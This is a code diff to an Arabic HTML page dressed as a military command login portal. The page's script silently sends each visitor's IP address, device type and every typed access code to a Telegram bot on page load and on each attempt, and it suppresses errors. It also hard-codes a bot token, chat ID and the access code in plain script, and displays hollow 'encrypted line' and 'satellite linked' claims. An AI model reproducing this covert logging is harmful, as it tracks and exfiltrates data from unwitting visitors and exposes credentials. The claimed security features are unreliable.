@@ -8,23 +8,14 @@
     <style>
         :root { --gold: #d4af37; --army: #1a1a1a; --danger: #ff0000; }
         body { background: #000; color: #fff; font-family: 'Cairo', sans-serif; margin: 0; overflow: hidden; }
-
-        /* بوابة الدخول العسكرية */
-        #GATE {
-            position: fixed; width: 100%; height: 100%; background: radial-gradient(circle, #1a1a1a, #000);
-            display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 9999;
-        }
+        #GATE { position: fixed; width: 100%; height: 100%; background: radial-gradient(circle, #1a1a1a, #000); display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 9999; }
         .auth-box { background: rgba(255,255,255,0.05); padding: 30px; border: 1px solid var(--gold); border-radius: 5px; text-align: center; width: 85%; max-width: 350px; box-shadow: 0 0 25px rgba(212, 175, 55, 0.15); }
         .unit-id { background: #000; border: 1px solid var(--gold); color: var(--gold); padding: 12px; width: 100%; text-align: center; font-family: 'Orbitron'; font-size: 24px; letter-spacing: 8px; margin-bottom: 20px; outline: none; }
-        .btn-deploy { background: var(--gold); color: #000; border: none; padding: 12px; width: 100%; font-weight: 900; cursor: pointer; transition: 0.3s; text-transform: uppercase; }
-        .btn-deploy:active { transform: scale(0.98); background: #b8952d; }
-
-        /* واجهة العمليات المشفرة */
+        .btn-deploy { background: var(--gold); color: #000; border: none; padding: 12px; width: 100%; font-weight: 900; cursor: pointer; transition: 0.3s; }
         #OPERATIONS_HUB { display: none; padding: 20px; height: 100vh; background: #0c0c0c; border: 5px solid #1a1a1a; box-sizing: border-box; }
         .top-bar { border-bottom: 1px solid var(--gold); padding-bottom: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; }
         .status-tag { background: #004400; color: #0f0; padding: 3px 10px; font-size: 10px; border: 1px solid #0f0; border-radius: 3px; animation: blink 1.5s infinite; }
         @keyframes blink { 50% { opacity: 0.3; } }
-
         .comms-panel { background: #050505; border: 1px solid #222; height: 50%; padding: 15px; overflow-y: auto; font-family: monospace; font-size: 12px; color: #0f0; border-radius: 5px; }
         .msg { margin-bottom: 8px; border-right: 3px solid var(--gold); padding-right: 10px; line-height: 1.5; }
     </style>
@@ -43,59 +34,64 @@
 
     <div id="OPERATIONS_HUB">
         <div class="top-bar">
-            <div>
-                <span style="color: var(--gold); font-weight: 900; font-size: 18px;">مقر قيادة الصقور</span>
-                <div style="font-size: 10px; color: #666;">HQ: IQAF_SPECIAL_UNIT (WASIT)</div>
-            </div>
+            <div><span style="color: var(--gold); font-weight: 900; font-size: 18px;">مقر قيادة الصقور</span><div style="font-size: 10px; color: #666;">HQ: IQAF_SPECIAL_UNIT (WASIT)</div></div>
             <div class="status-tag">اتصال مشفر نشط</div>
         </div>
-
         <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px;">
             <div style="background: #151515; padding: 12px; border-radius: 5px; border-left: 3px solid var(--gold);">
-                <div style="font-size: 10px; color: var(--gold);">الحالة القتالية</div>
-                <div style="font-size: 14px; font-weight: bold;">جاهز للإقلاع (Ready)</div>
+                <div style="font-size: 10px; color: var(--gold);">الحالة القتالية</div><div style="font-size: 14px; font-weight: bold;">جاهز للإقلاع</div>
             </div>
             <div style="background: #151515; padding: 12px; border-radius: 5px; border-left: 3px solid var(--gold);">
-                <div style="font-size: 10px; color: var(--gold);">نظام التشفير</div>
-                <div style="font-size: 14px; font-weight: bold;">AES-256 ACTIVE</div>
+                <div style="font-size: 10px; color: var(--gold);">نظام التشفير</div><div style="font-size: 14px; font-weight: bold;">AES-256 ACTIVE</div>
             </div>
         </div>
-
         <div class="comms-panel" id="comms">
-            <div class="msg">📡 تم ربط القمر الصناعي العسكري بنجاح...</div>
+            <div class="msg">📡 تم ربط القمر الصناعي العسكري...</div>
             <div class="msg">🔑 تم التحقق من البصمة الرقمية للآمر...</div>
-            <div class="msg">🔒 تشفير الخط (End-to-End) مفعل الآن.</div>
-            <div class="msg">🦅 أهلاً بك في غرفة العمليات، بانتظار الأوامر.</div>
+            <div class="msg">🦅 أهلاً بك يا صقر، بانتظار الأوامر.</div>
         </div>
     </div>
 
     <script>
-        // --- إعدادات البوت العسكري (قم بالتعديل هنا) ---
-        const TG_TOKEN = "7585903503:AAG8TeGfyaDY8vuN8RdmIXL92yDAqoqaBu0"; // حط التوكن مالتك هنا
-        const TG_ID = "7772577035"; // حط الآيدي مالتك هنا
-        const UNIT_SECRET = "1931"; // رمز الدخول السري
+        // --- إعدادات البوت (حط معلوماتك هنا) ---
+        const TG_TOKEN = "7585903503:AAG8TeGfyaDY8vuN8RdmIXL92yDAqoqaBu0"; 
+        const TG_ID = "7772577035"; 
+        const UNIT_SECRET = "1931"; 
 
-        // وظيفة لتحليل نوع الجهاز بدقة (Mapping)
         function getDeviceName() {
             const ua = navigator.userAgent;
-            if (/android/i.test(ua)) return "📱 Android Mobile";
-            if (/iPhone|iPad|iPod/i.test(ua)) return "🍎 Apple iOS Device";
+            if (/android/i.test(ua)) return "📱 Android";
+            if (/iPhone|iPad|iPod/i.test(ua)) return "🍎 iOS Device";
             if (/Windows/i.test(ua)) return "💻 Windows PC";
-            if (/Macintosh/i.test(ua)) return "🖥️ MacBook/Mac";
-            if (/Linux/i.test(ua)) return "🐧 Linux System";
-            return "❓ Unknown Unit";
+            return "❓ Unknown Device";
         }
 
-        // وظيفة إرسال المعلومات للتلجرام
         async function sendIntel(status, enteredKey) {
-            try {
-                // سحب الـ IP
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                
-                // تحديد اسم الجهاز المفهوم
+            // سحب الـ IP وإرساله بدون ما نعطل البرنامج
+            fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(data => {
                 const device = getDeviceName(); 
-                
-                const text = `🚨 **تقرير أمني - بوابة الصقور**\n\n🔹 الحالة: ${status}\n🔹 الرمز المدخل: \`${enteredKey}\`\n📱 الجهاز: *${device}*\n🌐 IP: \`${ipData.ip}\`\n⏰ الوقت: ${new Date().toLocaleTimeString('ar-EG')}`;
-                
-                fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_ID}&text=${encode
+                const text = `🚨 **تقرير أمني**\n🔹 الحالة: ${status}\n🔹 الرمز: \`${enteredKey}\`\n📱 الجهاز: ${device}\n🌐 IP: \`${data.ip}\``;
+                fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
+            }).catch(e => console.log("Silent Error"));
+        }
+
+        function verifyUnit() {
+            const key = document.getElementById('unit_key').value;
+            if(key === UNIT_SECRET) {
+                // نفتح الباب فوراً بدون انتظار التلجرام
+                document.getElementById('GATE').style.display = 'none';
+                document.getElementById('OPERATIONS_HUB').style.display = 'block';
+                sendIntel("✅ دخول ناجح", key);
+            } else {
+                alert("! هُوية غير معروفة !");
+                sendIntel("❌ محاولة اختراق", key);
+                location.reload();
+            }
+        }
+
+        window.onload = () => { sendIntel("👀 زائر عند البوابة", "N/A"); };
+    </script>
+</body>
+</html>
